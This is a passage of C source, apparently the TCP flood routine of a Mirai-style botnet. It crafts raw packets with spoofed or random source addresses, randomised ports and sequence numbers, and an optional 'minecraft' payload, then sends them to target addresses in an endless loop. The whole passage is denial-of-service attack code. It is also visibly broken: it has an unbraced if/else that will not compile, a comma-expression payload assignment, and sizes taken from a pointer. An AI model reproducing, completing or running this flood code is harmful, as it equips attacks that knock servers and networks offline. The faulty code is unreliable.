    int minecraft = attack_get_opt_int(opts_len, opts, ATK_OPT_MC, 1);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if (sport == 0xffff)
    {
        //myb
        sport = htons(10000 + rand_next() % (65535 - 10000));
    } else {
        sport = htons(sport);
    }

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    int increase_size = rand_next() % 13;
    int start_size = 3;
    int userlen = start_size + increase_size;
    rand_alphastr(name_buf, userlen);
    name_buf[name_buf_len] = 0;
    char *slasher = "/";
    char *mcpayload = ("\x00\x02\xf1\x26\x01\x26\xf0\x90\xa6\xf0\x26\x57\x4e\xac\xa0\xec\xf8\x68\xe4\x8d\x21", name_buf);
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;

        pkts[i] = calloc(65535, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        if(minecraft == 1)
            iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + sizeof(mcpayload));
        else
            iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;

        if(minecraft == 1)
            tcph->ack = 1;
            tcph->rst = 1;
        else
          tcph->ack = ack_fl;

        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;

        *opts++ = PROTO_TCP_OPT_MSS;    
        *opts++ = 4;                   
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);

        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;

        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);

        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            if(minecraft == 1)
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + sizeof(mcpayload)), sizeof (struct tcphdr) + sizeof(mcpayload));
            else
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);

            targs[i].sock_addr.sin_port = tcph->dest;
            
            if(minecraft == 1)
                sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + sizeof(mcpayload), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
            else
                sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}